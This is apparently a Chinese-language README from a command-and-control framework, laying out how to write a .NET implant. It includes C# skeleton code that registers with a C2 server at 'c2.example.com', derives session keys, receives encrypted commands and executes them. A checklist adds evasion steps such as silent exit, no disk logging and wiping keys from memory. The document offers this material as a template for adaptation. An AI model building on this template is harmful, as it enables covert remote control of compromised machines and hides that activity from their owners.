# clients/dotnet —— .NET 植入体（占位说明）

> 目前只有 **Go 参考实现**（`clients/go`）。这里放的是"用 C#/F# 写一个同样能上线的植入体"所需的
> 全部要点与代码骨架，不是可编译工程——把它当模板改。

## 为什么值得做 .NET

| 场景 | 说明 |
|---|---|
| 目标机只有 .NET Framework 3.5/4.x | 无需自带 runtime，`CSharpCodeProvider` 或 `csc.exe` 原地编译 |
| 需要 `Add-Type` / PowerShell 宿主 | 内存加载 .NET 程序集比原生 PE 更自然 |
| 需要 WinRM / WMI / AD 交互 | `System.Management` 是现成的 |

体积参考：`dotnet publish -r win-x64 --self-contained false`（依赖框架）≈ 200 KB；
self-contained + trimming ≈ 12–15 MB。要比 Go 小就用 C/C++。

## 需要实现的四件事（与 Go 版完全一致）

1. `POST /v1/register`（HMAC + P-256 公钥）
2. `ECDH` 派生 `K_cmd / K_io / K_file`
3. `POST /v1/beacon` 或 `ClientWebSocket` 收 `cmd` 帧
4. `AesGcm` 解密 → 执行 → `AesGcm` 加密 → `res` 帧

## .NET 原语对照

```csharp
// ── 1) P-256 ECDH ────────────────────────────────
using var eph = ECDiffieHellman.Create(ECCurve.NamedCurves.nistP256);
byte[] pubRaw = ExportUncompressed(eph);            // 65 字节：0x04||X||Y
// 从 base64url 解出操作员公钥后：
using var opPub = ECDiffieHellman.Create();
opPub.ImportParameters(new ECParameters {
    Curve = ECCurve.NamedCurves.nistP256,
    Q = DecodePoint(opRaw)                          // .NET 没有"raw point"导入，需自己拆 X/Y
});
byte[] z = eph.DeriveRawSecretAgreement(opPub.PublicKey);   // .NET 8+；老版本用 DeriveKeyFromHash 后再截断

// ── 2) HKDF-SHA256 ───────────────────────────────
byte[] k = HKDF.DeriveKey(HashAlgorithmName.SHA256, z, 32, salt: sidBytes,
                          info: Encoding.ASCII.GetBytes("stc2/v1/cmd"));

// ── 3) AES-256-GCM ───────────────────────────────
using var aes = new AesGcm(k, tagSizeInBytes: 16);
aes.Decrypt(nonce, ciphertextWithTag, tag, plaintext, aad);   // 注意 .NET 8 的 AesGcm(byte[], int)
```

> **两个坑**：
> 1. `ECDiffieHellman` 不能直接导入 65 字节未压缩点，要手动拆成 `X`/`Y` 再 `ImportParameters`；
> 2. .NET Framework 没有 `AesGcm` 类 —— 用 `BCrypt` P/Invoke 或退回 `System.Security.Cryptography.Aes` + 自己算 GHASH（不推荐）。

## 最小骨架（伪代码）

```csharp
var cfg = new { endpoint = "https://c2.example.com", pskId = "...", psk = "...", opPub = "...", opFp = "..." };
var kReg = HKDF.DeriveKey(HashAlgorithmName.SHA256, B64u(cfg.psk), 32, null, "stc2/v1/reg"u8.ToArray());

var nc = RandomBytes(16);
var ts = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
using var h = new HMACSHA256(kReg);
var mac = h.ComputeHash(Encoding.UTF8.GetBytes($"{cfg.pskId}.{ts}.{B64u(nc)}"));

var reg = await http.PostAsJsonAsync($"{cfg.endpoint}/v1/register", new {
    v = 1, psk_id = cfg.pskId, ts, nc = B64u(nc), h = B64u(mac),
    pub = B64u(ephPubRaw), fp = Hex(SHA256(ephPubRaw)[..8])
});

// ... 派生 K，起 WebSocket 或轮询，解密 cmd，执行，加密 res（字段与 Go 版一一对应）
```

## 检查清单

- [ ] `op_fp` 不匹配 → 静默退出
- [ ] 401/403 → 停止
- [ ] 用 `ArrayPool<byte>` 或 `CryptographicOperations.ZeroMemory` 清密钥
- [ ] 不写磁盘日志；异常只走 `Debug.WriteLine`（release 下为空）
- [ ] 结果里的 `tid`/`rid` 原样带回

完整字段定义见 [docs/04-client/01-implant-spec.md](../../docs/04-client/01-implant-spec.md)。
